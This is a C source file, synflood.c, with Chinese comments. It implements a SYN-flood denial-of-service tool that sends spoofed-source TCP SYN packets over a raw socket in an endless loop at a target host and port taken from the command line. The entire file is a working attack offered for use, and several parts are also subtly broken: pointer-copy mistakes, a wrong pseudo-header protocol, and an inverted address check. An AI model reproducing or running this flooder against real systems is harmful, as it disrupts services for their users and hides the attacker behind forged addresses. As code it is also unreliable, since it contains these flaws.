/************************************************************************/
/*	synflood.c															*/
/*	@2013-03-21															*/
/************************************************************************/
#include<stdio.h>
#include<errno.h>
#include<sys/time.h>
#include<sys/socket.h>//与套接字相关的函数声明和结构体定义
#include<netinet/in.h>//某些结构体的声明，宏定义如struct sockaddr_in
#include<netdb.h>//某些结构体定义，宏定义和声明如struct hostent
#include<ctype.h>
#include<sys/types.h>//包含很多类型重定义
#include<stdlib.h>
#include<arpa/inet.h>//某些函数声明如inet_ntoa()
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<string.h>
 
#define FAKE_IP "10.0.11.20"//伪装IP的起始值
 
typedef unsigned short ushort;
typedef unsigned char uchar;
typedef unsigned long ulong;
typedef unsigned int uint;
 
int FakeIpNet;
int FakeIpHost;
int SendSEQ;//发送序列号
 
static inline long myrandom(int begin,int end)
{
   // int gap = end - begin + 1;
    int ret = 0;
    //随机种子
    srand((unsigned)time(NULL));
    ret = rand() % end + begin;//产生一个介于begin 和 end之间的值
    return ret;
}
//校验和的计算
static ushort chksum(ushort *data,ushort length)
{
    int nleft = length;
    int sum = 0;
    ushort *word = data;
    ushort ret = 0;
    //计算偶数字节
    while(nleft > 1)
    {
        sum += *word++;
        nleft -= 2;
    }
    //如果位奇数，将最后一个字节单独计算，剩余的一个字节位高字节构建一个short类型变量值
    if(nleft == 1)
    {
        *(uchar *)(&ret) = *(uchar *)word;
        sum += ret;
    }
    //折叠
    sum = (sum >> 16)+(sum & 0xffff);
    sum += (sum >> 16);
    //取反
    ret = ~sum;
    return (ret);
}
 
void sendsynfunc(int sockfd,struct sockaddr_in *addr)
{
    int count;//统计发送循环次数
    char buf[40];//校验和计算
    char sendBuf[100];
    struct ip *ip;
    struct tcphdr *tcp;
    struct prehdr//tcp伪首部
    {
        struct sockaddr_in sourceaddr;//源地址
        struct sockaddr_in destaddr;//目标地址
        uchar zero;
        uchar protocol;
        ushort length;
    }prehdr;
   int len = sizeof(struct ip)+sizeof(struct tcphdr);
    //开始填充ip与tcp首部
   bzero(buf,sizeof(buf));
   bzero(sendBuf,sizeof(sendBuf));
   ip = (struct ip *)sendBuf;//指向发送缓冲区的头部
   ip->ip_v = 4;
   ip->ip_hl = 5;
   ip->ip_tos = 0;
   ip->ip_len = htons(len);
   ip->ip_id = 0;
   ip->ip_off = 0;//由内核填写
   ip->ip_ttl = myrandom(128,255);
   ip->ip_p = IPPROTO_TCP;
   ip->ip_sum = 0;
   ip->ip_dst = addr->sin_addr;//目的地址，即攻击目标
   printf("ipheader fill finished\n");
   tcp=(struct tcphdr*)(sendBuf+sizeof(struct ip));//获取指向TCP头部的指针
   tcp->seq = htonl((ulong)myrandom(0,65535));
   tcp->dest = addr->sin_port;//目的端口
   tcp->ack_seq = htons(myrandom(0,65535));
   tcp->syn = 1;
   tcp->urg = 1;
   tcp->window = htons(myrandom(0,65535));
   tcp->check = 0;//校验和
   tcp->urg_ptr = htons(myrandom(0,65535));
   //循环发送
   while(1)
   {
       if(SendSEQ++ == 65535)
            SendSEQ = 1;//序列号循环
       //更新ip首部
       ip->ip_src.s_addr = htonl(FakeIpHost+SendSEQ);//每次随机产生源ip地址
       ip->ip_sum = 0;
       //更新tcp首部
       tcp->seq = htonl(0x12345678+SendSEQ);
       tcp->check = 0; 
       // ip->ip_src.s_addr = myrandom(0,65535);
       printf("source addr is :%s\n",inet_ntoa(ip->ip_src));
       printf("dest addr is :%s\n",inet_ntoa(addr->sin_addr));
       printf("\n============================\n");
       //tcp伪首部数据填充
       prehdr.sourceaddr.sin_addr = ip->ip_src;
       prehdr.destaddr.sin_addr = addr->sin_addr;
       prehdr.zero = 0;
       prehdr.protocol = 4;
       prehdr.length = sizeof(struct tcphdr);
       //封装tcp首部与伪首部至buf;
       memcpy(buf,&prehdr,sizeof( prehdr));
       memcpy(buf+sizeof( prehdr),&tcp,sizeof(struct tcphdr));
       tcp->check = chksum((u_short *)&buf,12+sizeof(struct tcphdr));//校验和计算
       //封装ip和tcp首部数据包至sendBuf
       memcpy(sendBuf,&ip,sizeof(ip));
       memcpy(sendBuf+sizeof(ip),&tcp,sizeof(tcp));
       sendto(sockfd,sendBuf,len,0,(struct sockaddr *)&addr,sizeof(struct sockaddr));     
   }
}
int main(int argc,char *argv[])
{
    struct sockaddr_in addr;//目标主机地址
    int sockfd;
    struct hostent *host;
    int on = 1;
    int ret;
    if(argc < 3 || argc > 3)
    {
        printf("usage:synflood desthostip desthostport\n");
        return 1;
    }
    bzero(&addr,sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(argv[2]));
    //伪装ip
    FakeIpNet = inet_addr(FAKE_IP);
    FakeIpHost = ntohl(FakeIpNet);
    
    if((ret = inet_aton(argv[1],&addr.sin_addr)) != 0)
    {
       if(( host = gethostbyname(argv[1])) == NULL)
       {
           printf("desthost name error:%s %s \n",argv[1],hstrerror(h_errno));
           return 1;
       }else{
           memcpy((char *)&addr.sin_addr,(host->h_addr_list)[0],host->h_length);
       }
       //设置原始套接字，并设置选项为IP选项
       sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);//root身份才可成功执行
       if(sockfd < 0){
           printf("socket error\n");
           return 1;
       }
       //IP_HDRINCL在数据中包中包含ip首部
       setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
       setuid(getpid());
       sendsynfunc(sockfd,&addr);
   }
       return 0;
}
